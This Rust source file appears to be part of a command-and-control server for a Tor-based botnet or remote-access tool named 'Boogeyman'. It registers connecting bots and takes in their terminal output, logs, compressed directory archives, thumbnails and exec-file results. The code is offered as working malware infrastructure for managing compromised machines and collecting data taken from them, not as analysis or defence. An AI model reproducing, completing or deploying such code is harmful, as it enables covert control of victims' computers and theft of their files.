use std::{ collections::HashMap, sync::Arc };
use chrono::Utc;
use client_vars::types::send::{ BoogeymanSendPayload, ServerAction, ServerParams };
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use super::{ sanitization::verify_client_init, tor::{ Bot, ClientInstance, TorServerHandler } };
use anyhow::Result;

pub async fn route_client(
    handler: &TorServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::Init => {
            return init(handler, payload, stream_ref).await;
        }
        ServerAction::TerminalOutput => {
            // in each - verify id and version - must exist in inited list if not ignore
            if let ServerParams::TerminalOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::LogsData => {
            if let ServerParams::LogsData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::CompressedDir => {
            if let ServerParams::CompressedDir(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateThumbnail => {
            if let ServerParams::UpdateThumbnail(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateDynamicData => {
            if let ServerParams::UpdateDynamicData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::ExecFileOutput => {
            if let ServerParams::ExecFileOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
    }
    Ok(())
}

pub async fn init(
    handler: &TorServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::Init(params) = payload.params {
        verify_client_init(&params)?;
        // first sanitize botstate
        let mut bot_map = handler.bot_map.write().await;
        let bot = bot_map.entry(payload.id.clone()).or_insert(Bot::new(payload.id));

        bot.client_instances.push(ClientInstance {
            join_date: Utc::now().to_string(),
            version: payload.version,
            bot_state: params.bot_state,
            console: String::new(),
        });
        drop(bot_map);
        Ok(())
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
